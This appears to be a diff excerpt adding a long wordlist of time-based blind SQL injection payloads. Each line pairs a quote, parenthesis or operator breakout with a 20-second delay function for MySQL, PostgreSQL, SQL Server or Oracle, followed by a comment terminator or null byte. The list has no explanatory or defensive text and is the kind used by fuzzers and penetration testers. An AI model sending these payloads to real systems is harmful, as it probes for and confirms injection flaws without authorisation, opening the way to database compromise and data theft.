+'(SELECT pg_sleep(20);%00
+'(SELECT pg_sleep(20);--
+'(SELECT pg_sleep(20);-- -
+'(SELECT pg_sleep(20);/*
+'(WAITFOR DELAY '0:0:20'
+'(WAITFOR DELAY '0:0:20' 
+'(WAITFOR DELAY '0:0:20'"
+'(WAITFOR DELAY '0:0:20'#
+'(WAITFOR DELAY '0:0:20''
+'(WAITFOR DELAY '0:0:20')"
+'(WAITFOR DELAY '0:0:20')'
+'(WAITFOR DELAY '0:0:20'--
+'(WAITFOR DELAY '0:0:20'-- -
+'(WAITFOR DELAY '0:0:20'/*
+'(WAITFOR DELAY '0:0:20';#
+'(WAITFOR DELAY '0:0:20';%00
+'(WAITFOR DELAY '0:0:20';--
+'(WAITFOR DELAY '0:0:20';-- -
+'(WAITFOR DELAY '0:0:20';/*
+'(dbms_pipe.receive_message(('a'),20)
+'(dbms_pipe.receive_message(('a'),20) 
+'(dbms_pipe.receive_message(('a'),20)"
+'(dbms_pipe.receive_message(('a'),20)#
+'(dbms_pipe.receive_message(('a'),20)'
+'(dbms_pipe.receive_message(('a'),20))"
+'(dbms_pipe.receive_message(('a'),20))'
+'(dbms_pipe.receive_message(('a'),20)--
+'(dbms_pipe.receive_message(('a'),20)-- -
+'(dbms_pipe.receive_message(('a'),20)/*
+'(dbms_pipe.receive_message(('a'),20);#
+'(dbms_pipe.receive_message(('a'),20);%00
+'(dbms_pipe.receive_message(('a'),20);--
+'(dbms_pipe.receive_message(('a'),20);-- -
+'(dbms_pipe.receive_message(('a'),20);/*
+');SELECT SLEEP(20)
+');SELECT SLEEP(20) 
+');SELECT SLEEP(20)"
+');SELECT SLEEP(20)#
+');SELECT SLEEP(20)'
+');SELECT SLEEP(20))"
+');SELECT SLEEP(20))'
+');SELECT SLEEP(20)--
+');SELECT SLEEP(20)-- -
+');SELECT SLEEP(20)/*
+');SELECT SLEEP(20);#
+');SELECT SLEEP(20);%00
+');SELECT SLEEP(20);--
+');SELECT SLEEP(20);-- -
+');SELECT SLEEP(20);/*
+');SELECT pg_sleep(20)
+');SELECT pg_sleep(20) 
+');SELECT pg_sleep(20)"
+');SELECT pg_sleep(20)#
+');SELECT pg_sleep(20)'
+');SELECT pg_sleep(20))"
+');SELECT pg_sleep(20))'
+');SELECT pg_sleep(20)--
+');SELECT pg_sleep(20)-- -
+');SELECT pg_sleep(20)/*
+');SELECT pg_sleep(20);#
+');SELECT pg_sleep(20);%00
+');SELECT pg_sleep(20);--
+');SELECT pg_sleep(20);-- -
+');SELECT pg_sleep(20);/*
+');WAITFOR DELAY '0:0:20'
+');WAITFOR DELAY '0:0:20' 
+');WAITFOR DELAY '0:0:20'"
+');WAITFOR DELAY '0:0:20'#
+');WAITFOR DELAY '0:0:20''
+');WAITFOR DELAY '0:0:20')"
+');WAITFOR DELAY '0:0:20')'
+');WAITFOR DELAY '0:0:20'--
+');WAITFOR DELAY '0:0:20'-- -
+');WAITFOR DELAY '0:0:20'/*
+');WAITFOR DELAY '0:0:20';#
+');WAITFOR DELAY '0:0:20';%00
+');WAITFOR DELAY '0:0:20';--
+');WAITFOR DELAY '0:0:20';-- -
+');WAITFOR DELAY '0:0:20';/*
+');dbms_pipe.receive_message(('a'),20)
+');dbms_pipe.receive_message(('a'),20) 
+');dbms_pipe.receive_message(('a'),20)"
+');dbms_pipe.receive_message(('a'),20)#
+');dbms_pipe.receive_message(('a'),20)'
+');dbms_pipe.receive_message(('a'),20))"
+');dbms_pipe.receive_message(('a'),20))'
+');dbms_pipe.receive_message(('a'),20)--
+');dbms_pipe.receive_message(('a'),20)-- -
+');dbms_pipe.receive_message(('a'),20)/*
+');dbms_pipe.receive_message(('a'),20);#
+');dbms_pipe.receive_message(('a'),20);%00
+');dbms_pipe.receive_message(('a'),20);--
+');dbms_pipe.receive_message(('a'),20);-- -
+');dbms_pipe.receive_message(('a'),20);/*
+')SELECT SLEEP(20)
+')SELECT SLEEP(20) 
+')SELECT SLEEP(20)"
+')SELECT SLEEP(20)#
+')SELECT SLEEP(20)'
+')SELECT SLEEP(20))"
+')SELECT SLEEP(20))'
+')SELECT SLEEP(20)--
+')SELECT SLEEP(20)-- -
+')SELECT SLEEP(20)/*
+')SELECT SLEEP(20);#
+')SELECT SLEEP(20);%00
+')SELECT SLEEP(20);--
+')SELECT SLEEP(20);-- -
+')SELECT SLEEP(20);/*
+')SELECT pg_sleep(20)
+')SELECT pg_sleep(20) 
+')SELECT pg_sleep(20)"
+')SELECT pg_sleep(20)#
+')SELECT pg_sleep(20)'
+')SELECT pg_sleep(20))"
+')SELECT pg_sleep(20))'
+')SELECT pg_sleep(20)--
+')SELECT pg_sleep(20)-- -
+')SELECT pg_sleep(20)/*
+')SELECT pg_sleep(20);#
+')SELECT pg_sleep(20);%00
+')SELECT pg_sleep(20);--
+')SELECT pg_sleep(20);-- -
+')SELECT pg_sleep(20);/*
+')WAITFOR DELAY '0:0:20'
+')WAITFOR DELAY '0:0:20' 
+')WAITFOR DELAY '0:0:20'"
+')WAITFOR DELAY '0:0:20'#
+')WAITFOR DELAY '0:0:20''
+')WAITFOR DELAY '0:0:20')"
+')WAITFOR DELAY '0:0:20')'
+')WAITFOR DELAY '0:0:20'--
+')WAITFOR DELAY '0:0:20'-- -
+')WAITFOR DELAY '0:0:20'/*
+')WAITFOR DELAY '0:0:20';#
+')WAITFOR DELAY '0:0:20';%00
+')WAITFOR DELAY '0:0:20';--
+')WAITFOR DELAY '0:0:20';-- -
+')WAITFOR DELAY '0:0:20';/*
+')dbms_pipe.receive_message(('a'),20)
+')dbms_pipe.receive_message(('a'),20) 
+')dbms_pipe.receive_message(('a'),20)"
+')dbms_pipe.receive_message(('a'),20)#
+')dbms_pipe.receive_message(('a'),20)'
+')dbms_pipe.receive_message(('a'),20))"
+')dbms_pipe.receive_message(('a'),20))'
+')dbms_pipe.receive_message(('a'),20)--
+')dbms_pipe.receive_message(('a'),20)-- -
+')dbms_pipe.receive_message(('a'),20)/*
+')dbms_pipe.receive_message(('a'),20);#
+')dbms_pipe.receive_message(('a'),20);%00
+')dbms_pipe.receive_message(('a'),20);--
+')dbms_pipe.receive_message(('a'),20);-- -
+')dbms_pipe.receive_message(('a'),20);/*
+';)SELECT SLEEP(20)
+';)SELECT SLEEP(20) 
+';)SELECT SLEEP(20)"
+';)SELECT SLEEP(20)#
+';)SELECT SLEEP(20)'
+';)SELECT SLEEP(20))"
+';)SELECT SLEEP(20))'
+';)SELECT SLEEP(20)--
+';)SELECT SLEEP(20)-- -
+';)SELECT SLEEP(20)/*
+';)SELECT SLEEP(20);#
+';)SELECT SLEEP(20);%00
+';)SELECT SLEEP(20);--
+';)SELECT SLEEP(20);-- -
+';)SELECT SLEEP(20);/*
+';)SELECT pg_sleep(20)
+';)SELECT pg_sleep(20) 
+';)SELECT pg_sleep(20)"
+';)SELECT pg_sleep(20)#
+';)SELECT pg_sleep(20)'
+';)SELECT pg_sleep(20))"
+';)SELECT pg_sleep(20))'
+';)SELECT pg_sleep(20)--
+';)SELECT pg_sleep(20)-- -
+';)SELECT pg_sleep(20)/*
+';)SELECT pg_sleep(20);#
+';)SELECT pg_sleep(20);%00
+';)SELECT pg_sleep(20);--
+';)SELECT pg_sleep(20);-- -
+';)SELECT pg_sleep(20);/*
+';)WAITFOR DELAY '0:0:20'
+';)WAITFOR DELAY '0:0:20' 
+';)WAITFOR DELAY '0:0:20'"
+';)WAITFOR DELAY '0:0:20'#
+';)WAITFOR DELAY '0:0:20''
+';)WAITFOR DELAY '0:0:20')"
+';)WAITFOR DELAY '0:0:20')'
+';)WAITFOR DELAY '0:0:20'--
+';)WAITFOR DELAY '0:0:20'-- -
+';)WAITFOR DELAY '0:0:20'/*
+';)WAITFOR DELAY '0:0:20';#
+';)WAITFOR DELAY '0:0:20';%00
+';)WAITFOR DELAY '0:0:20';--
+';)WAITFOR DELAY '0:0:20';-- -
+';)WAITFOR DELAY '0:0:20';/*
+';)dbms_pipe.receive_message(('a'),20)
+';)dbms_pipe.receive_message(('a'),20) 
+';)dbms_pipe.receive_message(('a'),20)"
+';)dbms_pipe.receive_message(('a'),20)#
+';)dbms_pipe.receive_message(('a'),20)'
+';)dbms_pipe.receive_message(('a'),20))"
+';)dbms_pipe.receive_message(('a'),20))'
+';)dbms_pipe.receive_message(('a'),20)--
+';)dbms_pipe.receive_message(('a'),20)-- -
+';)dbms_pipe.receive_message(('a'),20)/*
+';)dbms_pipe.receive_message(('a'),20);#
+';)dbms_pipe.receive_message(('a'),20);%00
+';)dbms_pipe.receive_message(('a'),20);--
+';)dbms_pipe.receive_message(('a'),20);-- -
+';)dbms_pipe.receive_message(('a'),20);/*
+'SELECT SLEEP(20)
+'SELECT SLEEP(20) 
+'SELECT SLEEP(20)"
+'SELECT SLEEP(20)#
+'SELECT SLEEP(20)'
+'SELECT SLEEP(20))"
+'SELECT SLEEP(20))'
+'SELECT SLEEP(20)--
+'SELECT SLEEP(20)-- -
+'SELECT SLEEP(20)/*
+'SELECT SLEEP(20);#
+'SELECT SLEEP(20);%00
+'SELECT SLEEP(20);--
+'SELECT SLEEP(20);-- -
+'SELECT SLEEP(20);/*
+'SELECT pg_sleep(20)
+'SELECT pg_sleep(20) 
+'SELECT pg_sleep(20)"
+'SELECT pg_sleep(20)#
+'SELECT pg_sleep(20)'
+'SELECT pg_sleep(20))"
+'SELECT pg_sleep(20))'
+'SELECT pg_sleep(20)--
+'SELECT pg_sleep(20)-- -
+'SELECT pg_sleep(20)/*
+'SELECT pg_sleep(20);#
+'SELECT pg_sleep(20);%00
+'SELECT pg_sleep(20);--
+'SELECT pg_sleep(20);-- -
+'SELECT pg_sleep(20);/*
+'WAITFOR DELAY '0:0:20'
+'WAITFOR DELAY '0:0:20' 
+'WAITFOR DELAY '0:0:20'"
+'WAITFOR DELAY '0:0:20'#
+'WAITFOR DELAY '0:0:20''
+'WAITFOR DELAY '0:0:20')"
+'WAITFOR DELAY '0:0:20')'
+'WAITFOR DELAY '0:0:20'--
+'WAITFOR DELAY '0:0:20'-- -
+'WAITFOR DELAY '0:0:20'/*
+'WAITFOR DELAY '0:0:20';#
+'WAITFOR DELAY '0:0:20';%00
+'WAITFOR DELAY '0:0:20';--
+'WAITFOR DELAY '0:0:20';-- -
+'WAITFOR DELAY '0:0:20';/*
+'dbms_pipe.receive_message(('a'),20)
+'dbms_pipe.receive_message(('a'),20) 
+'dbms_pipe.receive_message(('a'),20)"
+'dbms_pipe.receive_message(('a'),20)#
+'dbms_pipe.receive_message(('a'),20)'
+'dbms_pipe.receive_message(('a'),20))"
+'dbms_pipe.receive_message(('a'),20))'
+'dbms_pipe.receive_message(('a'),20)--
+'dbms_pipe.receive_message(('a'),20)-- -
+'dbms_pipe.receive_message(('a'),20)/*
+'dbms_pipe.receive_message(('a'),20);#
+'dbms_pipe.receive_message(('a'),20);%00
+'dbms_pipe.receive_message(('a'),20);--
+'dbms_pipe.receive_message(('a'),20);-- -
+'dbms_pipe.receive_message(('a'),20);/*
+(SELECT SLEEP(20)
+(SELECT SLEEP(20) 
+(SELECT SLEEP(20)"
+(SELECT SLEEP(20)#
+(SELECT SLEEP(20)'
+(SELECT SLEEP(20))"
+(SELECT SLEEP(20))'
+(SELECT SLEEP(20)--
+(SELECT SLEEP(20)-- -
+(SELECT SLEEP(20)/*
+(SELECT SLEEP(20);#
+(SELECT SLEEP(20);%00
+(SELECT SLEEP(20);--
+(SELECT SLEEP(20);-- -
+(SELECT SLEEP(20);/*
+(SELECT pg_sleep(20)
+(SELECT pg_sleep(20) 
+(SELECT pg_sleep(20)"
+(SELECT pg_sleep(20)#
+(SELECT pg_sleep(20)'
+(SELECT pg_sleep(20))"
+(SELECT pg_sleep(20))'
+(SELECT pg_sleep(20)--
+(SELECT pg_sleep(20)-- -
+(SELECT pg_sleep(20)/*
+(SELECT pg_sleep(20);#
+(SELECT pg_sleep(20);%00
+(SELECT pg_sleep(20);--
+(SELECT pg_sleep(20);-- -
+(SELECT pg_sleep(20);/*
+(WAITFOR DELAY '0:0:20'
+(WAITFOR DELAY '0:0:20' 
+(WAITFOR DELAY '0:0:20'"
+(WAITFOR DELAY '0:0:20'#
+(WAITFOR DELAY '0:0:20''
+(WAITFOR DELAY '0:0:20')"
+(WAITFOR DELAY '0:0:20')'
+(WAITFOR DELAY '0:0:20'--
+(WAITFOR DELAY '0:0:20'-- -
+(WAITFOR DELAY '0:0:20'/*
+(WAITFOR DELAY '0:0:20';#
+(WAITFOR DELAY '0:0:20';%00
+(WAITFOR DELAY '0:0:20';--
+(WAITFOR DELAY '0:0:20';-- -
+(WAITFOR DELAY '0:0:20';/*
+(dbms_pipe.receive_message(('a'),20)
+(dbms_pipe.receive_message(('a'),20) 
+(dbms_pipe.receive_message(('a'),20)"
+(dbms_pipe.receive_message(('a'),20)#
+(dbms_pipe.receive_message(('a'),20)'
+(dbms_pipe.receive_message(('a'),20))"
+(dbms_pipe.receive_message(('a'),20))'
+(dbms_pipe.receive_message(('a'),20)--
+(dbms_pipe.receive_message(('a'),20)-- -
+(dbms_pipe.receive_message(('a'),20)/*
+(dbms_pipe.receive_message(('a'),20);#
+(dbms_pipe.receive_message(('a'),20);%00
+(dbms_pipe.receive_message(('a'),20);--
+(dbms_pipe.receive_message(('a'),20);-- -
+(dbms_pipe.receive_message(('a'),20);/*
++SELECT SLEEP(20)
++SELECT SLEEP(20) 
++SELECT SLEEP(20)"
++SELECT SLEEP(20)#
++SELECT SLEEP(20)'
++SELECT SLEEP(20))"
++SELECT SLEEP(20))'
++SELECT SLEEP(20)--
++SELECT SLEEP(20)-- -
++SELECT SLEEP(20)/*
++SELECT SLEEP(20);#
++SELECT SLEEP(20);%00
++SELECT SLEEP(20);--
++SELECT SLEEP(20);-- -
++SELECT SLEEP(20);/*
++SELECT pg_sleep(20)
++SELECT pg_sleep(20) 
++SELECT pg_sleep(20)"
++SELECT pg_sleep(20)#
++SELECT pg_sleep(20)'
++SELECT pg_sleep(20))"
++SELECT pg_sleep(20))'
++SELECT pg_sleep(20)--
++SELECT pg_sleep(20)-- -
++SELECT pg_sleep(20)/*
++SELECT pg_sleep(20);#
++SELECT pg_sleep(20);%00
++SELECT pg_sleep(20);--
++SELECT pg_sleep(20);-- -
++SELECT pg_sleep(20);/*
++WAITFOR DELAY '0:0:20'
++WAITFOR DELAY '0:0:20' 
++WAITFOR DELAY '0:0:20'"
++WAITFOR DELAY '0:0:20'#
++WAITFOR DELAY '0:0:20''
++WAITFOR DELAY '0:0:20')"
++WAITFOR DELAY '0:0:20')'
++WAITFOR DELAY '0:0:20'--
++WAITFOR DELAY '0:0:20'-- -
++WAITFOR DELAY '0:0:20'/*
++WAITFOR DELAY '0:0:20';#
++WAITFOR DELAY '0:0:20';%00
++WAITFOR DELAY '0:0:20';--
++WAITFOR DELAY '0:0:20';-- -
++WAITFOR DELAY '0:0:20';/*
++dbms_pipe.receive_message(('a'),20)
++dbms_pipe.receive_message(('a'),20) 
++dbms_pipe.receive_message(('a'),20)"
++dbms_pipe.receive_message(('a'),20)#
++dbms_pipe.receive_message(('a'),20)'
++dbms_pipe.receive_message(('a'),20))"
++dbms_pipe.receive_message(('a'),20))'
++dbms_pipe.receive_message(('a'),20)--
++dbms_pipe.receive_message(('a'),20)-- -
++dbms_pipe.receive_message(('a'),20)/*
++dbms_pipe.receive_message(('a'),20);#
++dbms_pipe.receive_message(('a'),20);%00
++dbms_pipe.receive_message(('a'),20);--
++dbms_pipe.receive_message(('a'),20);-- -
++dbms_pipe.receive_message(('a'),20);/*
+-SELECT SLEEP(20)
+-SELECT SLEEP(20) 
+-SELECT SLEEP(20)"
+-SELECT SLEEP(20)#
+-SELECT SLEEP(20)'
+-SELECT SLEEP(20))"
+-SELECT SLEEP(20))'
+-SELECT SLEEP(20)--
+-SELECT SLEEP(20)-- -
+-SELECT SLEEP(20)/*
+-SELECT SLEEP(20);#
+-SELECT SLEEP(20);%00
+-SELECT SLEEP(20);--
+-SELECT SLEEP(20);-- -
+-SELECT SLEEP(20);/*
+-SELECT pg_sleep(20)
+-SELECT pg_sleep(20) 
+-SELECT pg_sleep(20)"
+-SELECT pg_sleep(20)#
+-SELECT pg_sleep(20)'
+-SELECT pg_sleep(20))"
+-SELECT pg_sleep(20))'
+-SELECT pg_sleep(20)--
+-SELECT pg_sleep(20)-- -
+-SELECT pg_sleep(20)/*
+-SELECT pg_sleep(20);#
+-SELECT pg_sleep(20);%00
+-SELECT pg_sleep(20);--
+-SELECT pg_sleep(20);-- -
+-SELECT pg_sleep(20);/*
+-WAITFOR DELAY '0:0:20'
+-WAITFOR DELAY '0:0:20' 
+-WAITFOR DELAY '0:0:20'"
+-WAITFOR DELAY '0:0:20'#
+-WAITFOR DELAY '0:0:20''
+-WAITFOR DELAY '0:0:20')"
+-WAITFOR DELAY '0:0:20')'
+-WAITFOR DELAY '0:0:20'--
+-WAITFOR DELAY '0:0:20'-- -
+-WAITFOR DELAY '0:0:20'/*
+-WAITFOR DELAY '0:0:20';#
+-WAITFOR DELAY '0:0:20';%00
+-WAITFOR DELAY '0:0:20';--
+-WAITFOR DELAY '0:0:20';-- -
+-WAITFOR DELAY '0:0:20';/*
+-dbms_pipe.receive_message(('a'),20)
+-dbms_pipe.receive_message(('a'),20) 
+-dbms_pipe.receive_message(('a'),20)"
+-dbms_pipe.receive_message(('a'),20)#
+-dbms_pipe.receive_message(('a'),20)'
+-dbms_pipe.receive_message(('a'),20))"
+-dbms_pipe.receive_message(('a'),20))'
+-dbms_pipe.receive_message(('a'),20)--
+-dbms_pipe.receive_message(('a'),20)-- -
+-dbms_pipe.receive_message(('a'),20)/*
+-dbms_pipe.receive_message(('a'),20);#
+-dbms_pipe.receive_message(('a'),20);%00
+-dbms_pipe.receive_message(('a'),20);--
+-dbms_pipe.receive_message(('a'),20);-- -
+-dbms_pipe.receive_message(('a'),20);/*
+=SELECT SLEEP(20)
+=SELECT SLEEP(20) 
+=SELECT SLEEP(20)"
+=SELECT SLEEP(20)#
+=SELECT SLEEP(20)'
+=SELECT SLEEP(20))"
+=SELECT SLEEP(20))'
+=SELECT SLEEP(20)--
+=SELECT SLEEP(20)-- -
+=SELECT SLEEP(20)/*
+=SELECT SLEEP(20);#
+=SELECT SLEEP(20);%00
+=SELECT SLEEP(20);--
+=SELECT SLEEP(20);-- -
+=SELECT SLEEP(20);/*
+=SELECT pg_sleep(20)
+=SELECT pg_sleep(20) 
+=SELECT pg_sleep(20)"
+=SELECT pg_sleep(20)#
+=SELECT pg_sleep(20)'
+=SELECT pg_sleep(20))"
+=SELECT pg_sleep(20))'
+=SELECT pg_sleep(20)--
+=SELECT pg_sleep(20)-- -
+=SELECT pg_sleep(20)/*
+=SELECT pg_sleep(20);#
+=SELECT pg_sleep(20);%00
+=SELECT pg_sleep(20);--
+=SELECT pg_sleep(20);-- -
+=SELECT pg_sleep(20);/*
+=WAITFOR DELAY '0:0:20'
+=WAITFOR DELAY '0:0:20' 
+=WAITFOR DELAY '0:0:20'"
+=WAITFOR DELAY '0:0:20'#
+=WAITFOR DELAY '0:0:20''
+=WAITFOR DELAY '0:0:20')"
+=WAITFOR DELAY '0:0:20')'
+=WAITFOR DELAY '0:0:20'--
+=WAITFOR DELAY '0:0:20'-- -
+=WAITFOR DELAY '0:0:20'/*
+=WAITFOR DELAY '0:0:20';#
+=WAITFOR DELAY '0:0:20';%00
+=WAITFOR DELAY '0:0:20';--
+=WAITFOR DELAY '0:0:20';-- -
+=WAITFOR DELAY '0:0:20';/*
+=dbms_pipe.receive_message(('a'),20)
+=dbms_pipe.receive_message(('a'),20) 
+=dbms_pipe.receive_message(('a'),20)"
+=dbms_pipe.receive_message(('a'),20)#
+=dbms_pipe.receive_message(('a'),20)'
+=dbms_pipe.receive_message(('a'),20))"
+=dbms_pipe.receive_message(('a'),20))'
+=dbms_pipe.receive_message(('a'),20)--
+=dbms_pipe.receive_message(('a'),20)-- -
+=dbms_pipe.receive_message(('a'),20)/*
+=dbms_pipe.receive_message(('a'),20);#
+=dbms_pipe.receive_message(('a'),20);%00
+=dbms_pipe.receive_message(('a'),20);--
+=dbms_pipe.receive_message(('a'),20);-- -
+=dbms_pipe.receive_message(('a'),20);/*
+SELECT SLEEP(20)
+SELECT SLEEP(20) 
+SELECT SLEEP(20)"
+SELECT SLEEP(20)#
+SELECT SLEEP(20)'
+SELECT SLEEP(20))"
+SELECT SLEEP(20))'
+SELECT SLEEP(20)--
+SELECT SLEEP(20)-- -
+SELECT SLEEP(20)/*
+SELECT SLEEP(20);#
+SELECT SLEEP(20);%00
+SELECT SLEEP(20);--
+SELECT SLEEP(20);-- -
+SELECT SLEEP(20);/*
+SELECT pg_sleep(20)
+SELECT pg_sleep(20) 
+SELECT pg_sleep(20)"
+SELECT pg_sleep(20)#
+SELECT pg_sleep(20)'
+SELECT pg_sleep(20))"
+SELECT pg_sleep(20))'
+SELECT pg_sleep(20)--
+SELECT pg_sleep(20)-- -
+SELECT pg_sleep(20)/*
+SELECT pg_sleep(20);#
+SELECT pg_sleep(20);%00
+SELECT pg_sleep(20);--
+SELECT pg_sleep(20);-- -
+SELECT pg_sleep(20);/*
+WAITFOR DELAY '0:0:20'
+WAITFOR DELAY '0:0:20' 
+WAITFOR DELAY '0:0:20'"
+WAITFOR DELAY '0:0:20'#
+WAITFOR DELAY '0:0:20''
+WAITFOR DELAY '0:0:20')"
+WAITFOR DELAY '0:0:20')'
+WAITFOR DELAY '0:0:20'--
+WAITFOR DELAY '0:0:20'-- -
+WAITFOR DELAY '0:0:20'/*
+WAITFOR DELAY '0:0:20';#
+WAITFOR DELAY '0:0:20';%00
+WAITFOR DELAY '0:0:20';--
+WAITFOR DELAY '0:0:20';-- -
+WAITFOR DELAY '0:0:20';/*
+dbms_pipe.receive_message(('a'),20)
+dbms_pipe.receive_message(('a'),20) 
+dbms_pipe.receive_message(('a'),20)"
+dbms_pipe.receive_message(('a'),20)#
+dbms_pipe.receive_message(('a'),20)'
+dbms_pipe.receive_message(('a'),20))"
+dbms_pipe.receive_message(('a'),20))'
+dbms_pipe.receive_message(('a'),20)--
+dbms_pipe.receive_message(('a'),20)-- -
+dbms_pipe.receive_message(('a'),20)/*
+dbms_pipe.receive_message(('a'),20);#
+dbms_pipe.receive_message(('a'),20);%00
+dbms_pipe.receive_message(('a'),20);--
+dbms_pipe.receive_message(('a'),20);-- -
+dbms_pipe.receive_message(('a'),20);/*
+||SELECT SLEEP(20)
+||SELECT SLEEP(20) 
+||SELECT SLEEP(20)"
+||SELECT SLEEP(20)#
+||SELECT SLEEP(20)'
+||SELECT SLEEP(20))"
+||SELECT SLEEP(20))'
+||SELECT SLEEP(20)--
+||SELECT SLEEP(20)-- -
+||SELECT SLEEP(20)/*
+||SELECT SLEEP(20);#
+||SELECT SLEEP(20);%00
+||SELECT SLEEP(20);--
+||SELECT SLEEP(20);-- -
+||SELECT SLEEP(20);/*
+||SELECT pg_sleep(20)
+||SELECT pg_sleep(20) 
+||SELECT pg_sleep(20)"
+||SELECT pg_sleep(20)#
+||SELECT pg_sleep(20)'
+||SELECT pg_sleep(20))"
+||SELECT pg_sleep(20))'
+||SELECT pg_sleep(20)--
+||SELECT pg_sleep(20)-- -
+||SELECT pg_sleep(20)/*
+||SELECT pg_sleep(20);#
+||SELECT pg_sleep(20);%00
+||SELECT pg_sleep(20);--
+||SELECT pg_sleep(20);-- -
+||SELECT pg_sleep(20);/*
+||WAITFOR DELAY '0:0:20'
+||WAITFOR DELAY '0:0:20' 
+||WAITFOR DELAY '0:0:20'"
+||WAITFOR DELAY '0:0:20'#
+||WAITFOR DELAY '0:0:20''
+||WAITFOR DELAY '0:0:20')"
+||WAITFOR DELAY '0:0:20')'
+||WAITFOR DELAY '0:0:20'--
+||WAITFOR DELAY '0:0:20'-- -
+||WAITFOR DELAY '0:0:20'/*
+||WAITFOR DELAY '0:0:20';#
+||WAITFOR DELAY '0:0:20';%00
+||WAITFOR DELAY '0:0:20';--
+||WAITFOR DELAY '0:0:20';-- -
+||WAITFOR DELAY '0:0:20';/*
+||dbms_pipe.receive_message(('a'),20)
+||dbms_pipe.receive_message(('a'),20) 
+||dbms_pipe.receive_message(('a'),20)"
+||dbms_pipe.receive_message(('a'),20)#
+||dbms_pipe.receive_message(('a'),20)'
+||dbms_pipe.receive_message(('a'),20))"
+||dbms_pipe.receive_message(('a'),20))'
+||dbms_pipe.receive_message(('a'),20)--
+||dbms_pipe.receive_message(('a'),20)-- -
+||dbms_pipe.receive_message(('a'),20)/*
+||dbms_pipe.receive_message(('a'),20);#
+||dbms_pipe.receive_message(('a'),20);%00
+||dbms_pipe.receive_message(('a'),20);--
+||dbms_pipe.receive_message(('a'),20);-- -
+||dbms_pipe.receive_message(('a'),20);/*
